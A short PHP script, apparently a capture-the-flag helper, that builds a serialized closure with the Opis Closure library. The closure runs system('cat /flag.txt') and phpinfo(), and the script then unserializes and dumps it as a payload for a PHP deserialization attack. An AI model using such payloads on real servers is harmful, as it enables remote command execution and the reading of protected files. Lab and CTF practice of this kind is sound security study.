<?php
include("closure/autoload.php");
      $a = function(){system('cat /flag.txt');phpinfo();  };
      $a = \Opis\Closure\serialize($a);
      $b = unserialize($a);
      var_dump($b);
    //   call_user_func($b,9);